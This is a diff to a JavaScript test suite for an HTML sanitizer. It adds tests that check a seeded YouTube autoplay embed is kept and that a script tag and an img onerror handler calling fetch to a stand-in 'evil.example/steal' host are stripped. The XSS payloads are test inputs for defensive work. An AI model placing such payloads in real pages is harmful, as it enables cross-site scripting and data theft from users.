@@ -34,6 +34,27 @@ describe("sanitizeHtml — must fire", () => {
     expect(html).toBe("<p>hi</p><p>bye</p>");
   });
 
+  it("still strips a script and an onerror handler sitting beside the seeded autoplay embed", () => {
+    // The must-fire companion to "preserves the seeded venue-walkthrough
+    // embed's autoplay and mute query params" below — proves the query-string
+    // change to that embed did not loosen anything else in the same blob.
+    // Mirrors the real shape scripts/seed.mjs writes: the legitimate embed and
+    // a hostile payload land in the same html_embed value.
+    const blob =
+      '<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" ' +
+      'title="Venue walkthrough" frameborder="0" allowfullscreen></iframe>' +
+      '<script>alert("xss")</script>' +
+      '<img src="x" onerror="fetch(\'https://evil.example/steal\')">';
+    const html = clean(blob);
+    expect(html).toContain(
+      'src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&amp;mute=1"',
+    );
+    expect(html).not.toContain("<script");
+    expect(html).not.toContain('alert("xss")');
+    expect(html).not.toContain("onerror");
+    expect(html).not.toContain("evil.example");
+  });
+
   it("does not trust a self-closing <script/>", () => {
     const html = clean('<script src="https://evil.example/x.js"/>alert(9)</script><p>ok</p>');
     expect(html).not.toContain("alert(9)");
@@ -171,6 +192,22 @@ describe("sanitizeHtml — must NOT fire", () => {
     expect(html).toContain('height="315"');
     expect(html).toContain("allowfullscreen");
     expect(html).toContain("</iframe>");
+  });
+
+  it("preserves the seeded venue-walkthrough embed's autoplay and mute query params", () => {
+    // The exact src scripts/seed.mjs writes for the venue-walkthrough resource
+    // page: browsers only allow autoplay when it is also muted, so both
+    // params travel together in the query string, not as separate attributes.
+    const embed =
+      '<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" ' +
+      'title="Venue walkthrough" frameborder="0" allowfullscreen></iframe>';
+    const html = clean(embed);
+    // `&` in an attribute value is legitimately serialised as `&amp;` — this is
+    // what an HTML parser (and therefore the browser loading the iframe) reads
+    // back as the literal `?autoplay=1&mute=1` query string, not a truncation.
+    expect(html).toContain(
+      'src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&amp;mute=1"',
+    );
   });
 
   it("preserves youtube-nocookie and youtu.be embeds", () => {
